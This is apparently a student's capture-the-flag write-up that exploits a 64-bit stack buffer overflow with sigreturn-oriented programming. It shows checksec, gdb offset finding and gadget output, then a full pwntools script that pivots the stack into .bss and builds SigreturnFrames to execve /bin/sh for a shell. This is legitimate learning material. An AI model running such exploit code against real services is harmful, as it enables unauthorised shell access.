# Binary 

- first at the start of the challenge i had to look through the main file so i put tat in ghidra an got like the decompiled code of that i got a main function that had mentioned the bffer size and that it acccepts 272 bytes. can come in that. 


## Method
```bash
undefined8 main(void)

{
  undefined1 local_108 [256];
  
  setup();
  alarm(0x3c);
  read(0,local_108,0x110);
  return 0;
}

```
- so after that i knew that i need an offset so i started searching for that i first wrote this commandwhere i had so see if there was any pie enabled or there is any nx or there is stack canaru

```bash

mahek@mahek-Inspiron-14-5430:~/Downloads/rvy3r1$ checksec --file=main
file main
readelf -h main
readelf -l main
strings -n 4 main | grep bin
[*] '/home/mahek/Downloads/rvy3r1/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e65c339bd9c9dcded3af3b5a8fd62f166351edd5, for GNU/Linux 3.2.0, not stripped
ELF Header:
```
- we get to know that no pie or canry is there we have to find the offset
- we need to overflow the buffer and get the offset value 
```bash
to that we need to iverflow the buffer and get the the offset value ok
  mahek@mahek-Inspiron-14-5430:~/Downloads/rvy3r1$ python3 - << 'EOF'
from pwn import *
print(cyclic(300))
EOF
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
mahek@mahek-Inspiron-14-5430:~/Downloads/rvy3r1$ ./main <<< $(python3 -c "from pwn import *; print(cyclic(300))")
Segmentation fault (core dumped)
mahek@mahek-Inspiron-14-5430:~/Downloads/rvy3r1$ gdb ./main
(gdb) run <<< $(python3 -c "from pwn import *; print(cyclic(300))")
(gdb) i r
(gdb) run <<< $(python3 -c "from pwn import *; print(cyclic(300))")
Starting program: /home/mahek/Downloads/rvy3r1/main <<< $(python3 -c "from pwn import *; print(cyclic(300))")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011c1 in main ()
(gdb) i r
rax            0x0                 0
rbx            0x0                 0
rcx            0x7ffff7d14852      140737351075922
rdx            0x110               272
rsi            0x7fffffffd9f0      140737488345584
rdi            0x0                 0
rbp            0x61706361616f6361  0x61706361616f6361
rsp            0x7fffffffdaf8      0x7fffffffdaf8
r8             0x7ffff7e1bf10      140737352154896
r9             0x7ffff7fc9040      140737353912384
r10            0x7ffff7c065e8      140737349969384
r11            0x246               582
r12            0x7fffffffdc08      140737488346120
r13            0x401183            4198787
r14            0x403e00            4210176
r15            0x7ffff7ffd040      140737354125376
rip            0x4011c1            0x4011c1 <main+62>
eflags         0x10203             [ CF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--
python3 - << 'EOF'
from pwn import *
print(cyclic_find(0x636161706361616f))
EOF
[!] cyclic_find() expected an integer argument <= 0xffffffff, you gave 0x636161706361616f
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
256



```
  
- since not the rip but the rbp was overflow we will use that and find the rip ka ffset as that is 8 bytes ahead of that

- next we need to find abut the gadgets which like syscall or something like that

```bash
python3 - << 'EOF'
from pwn import *
elf = ELF("./main")
rop = ROP(elf)
rop.find_gadget(["pop rdi", "ret"])
print(rop.gadgets)
EOF
[*] '/home/mahek/Downloads/rvy3r1/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loading gadgets for '/home/mahek/Downloads/rvy3r1/main'
{4198419: Gadget(0x401013, ['add esp, 8', 'ret'], [8], 0xc), 4198418: Gadget(0x401012, ['add rsp, 8', 'ret'], [8], 0xc), 4198848: Gadget(0x4011c0, ['leave', 'ret'], ['ebp', 'esp'], 0x2540be403), 4198701: Gadget(0x40112d, ['pop rbp', 'ret'], ['rbp'], 0x8), 4198422: Gadget(0x401016, ['ret'], [], 0x4), 4198780: Gadget(0x40117c, ['syscall'], [], 0x0)}


```

- when we checked the gadgets we get no pop rdi or ret that tells us that we cannot have a normal rop but when we look at it we get syscall that means we cannot directly call functions like system("bin/sh") but we have syscall so we have to do SROP which is Sigreturn oriented programming(SROP)

- we need to do that for that we will need a puython file that will pivot and and infiltrate
- for that we can make use of frame
- i could reach till here i am making the correct python file for that



```bash
#!/usr/bin/env python3
from pwn import *
import time, argparse

# ========== CONFIG - only change if addresses differ ==========
BINARY = "./main"
SYS_SYSCALL = 0x40117c        # syscall gadget
SETUP_PARTIAL = 0x40114a      # helper used in stage3 (from friend)
MAIN_READ_LOOP = 0x4011a2     # address to re-enter read loop
BSS_BASE = 0x404030           # .bss start (readelf -S main)
OFFSET = 256                  # overflow offset to saved RBP (you found 256)
# ============================================================

parser = argparse.ArgumentParser()
parser.add_argument("--remote", action="store_true")
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=1337)
args = parser.parse_args()

# Writable areas near .bss
BINSH_ADDR = BSS_BASE + 0x8        # where "/bin/sh\x00" will live
ARGV_ADDR  = BSS_BASE + 0x10       # place for argv pointer
FRAME_LOC  = BSS_BASE + 0xd0       # where we will place second-stage frame
STACK_PIVOT = BSS_BASE + 0x200     # pivot RSP/RBP area for frame execution

context.binary = ELF(BINARY)
context.arch = "amd64"
context.log_level = "info"

def start():
    if args.remote:
        return remote(args.host, args.port)
    else:
        return process(BINARY)

def build_stage1():
    # p1: overwrite saved RBP so the next read writes to FRAME_LOC (because read writes to RBP-0x100)
    saved_rbp_value = FRAME_LOC + 0x100
    p1 = flat({
        OFFSET: p64(saved_rbp_value),      # saved RBP
        OFFSET + 8: p64(MAIN_READ_LOOP)    # saved RIP -> re-enter read loop
    })
    return p1

def build_stage2():
    # p2: write a placeholder SROP frame body into FRAME_LOC+0x10
    frame = SigreturnFrame()
    frame.rip = SYS_SYSCALL
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = FRAME_LOC
    frame.rdx = 0

    # Place frame body at offset 16 (so FRAME_LOC+0x10 holds frame body)
    p2 = flat({
        16: bytes(frame)[8:],          # frame body starts at FRAME_LOC+0x10
        OFFSET: p64(FRAME_LOC),        # saved RBP for Stage3 target
        OFFSET + 8: p64(MAIN_READ_LOOP) # saved RIP -> re-enter read loop
    }, length=0x110)
    return p2

def build_stage3():
    # p3 initial content writes to BASE = FRAME_LOC - 0x100
    BASE = FRAME_LOC - 0x100   # base where this read will write (e.g., 0x404000)

    # initial p3: write syscall at offset 0, "/bin/sh\x00" at offset 8, argv pointer at 16, etc.
    p3 = flat({
        0:    p64(SYS_SYSCALL),       # overwrite slot with syscall (not required but kept)
        8:    b"/bin/sh\x00",         # BINSH_ADDR (BASE + 8 -> BINSH_ADDR)
        16:   p64(BINSH_ADDR),        # ARGV[0]
        24:   p64(0),                 # ARGV[1] = NULL
        64:   p64(15),                # filler (friend used this)
        OFFSET: p64(FRAME_LOC),      # saved RBP
        OFFSET + 8: p64(SETUP_PARTIAL) # saved RIP -> call setup_partial to align for sigreturn
    }, length=0x110)

    # Now create the actual execve SigreturnFrame that must be present at FRAME_LOC + 0x10
    exec_frame = SigreturnFrame()
    exec_frame.rip = SYS_SYSCALL
    exec_frame.rax = constants.SYS_execve   # 59
    exec_frame.rdi = BINSH_ADDR
    exec_frame.rsi = ARGV_ADDR
    exec_frame.rdx = 0
    exec_frame.rsp = STACK_PIVOT
    exec_frame.csgsfs = 0x002b000000000033

    # Compute where inside the p3 write the kernel will look for the frame:
    exec_offset = (FRAME_LOC + 0x10) - BASE   # expected to be 0x110 in your layout

    # Ensure p3 is long enough, then append the exec_frame bytes at exec_offset
    if len(p3) < exec_offset:
        p3 = p3.ljust(exec_offset, b'\x00')
    # Append the frame bytes (they will be written right after the initial 0x110 region)
    p3 = p3 + bytes(exec_frame)

    return p3

def exploit():
    p = start()
    # small pause so process stabilizes
    time.sleep(0.02)

    # Stage 1: pivot RBP so next read writes into FRAME_LOC
    log.info("Stage1: pivot rbp -> %s", hex(FRAME_LOC + 0x100))
    p.send(build_stage1())
    time.sleep(0.02)

    # Stage 2: write SROP frame body to FRAME_LOC+0x10
    log.info("Stage2: writing frame body at %s", hex(FRAME_LOC + 0x10))
    p.send(build_stage2())
    time.sleep(0.02)

    # Stage 3: write /bin/sh, argv, and the real execve sigreturn frame, then trigger
    p3 = build_stage3()
    log.info("Stage3: sending final payload (len=%d) to perform execve", len(p3))
    p.send(p3)
    # give kernel a bit more time to execute the sigreturn sequence
    time.sleep(0.1)

    log.info("Switching to interactive - if exploit succeeded you'll have a shell")
    p.interactive()

if __name__ == "__main__":
    exploit()

```
- the scipt on running gives the flag

## flag 
test{flag}



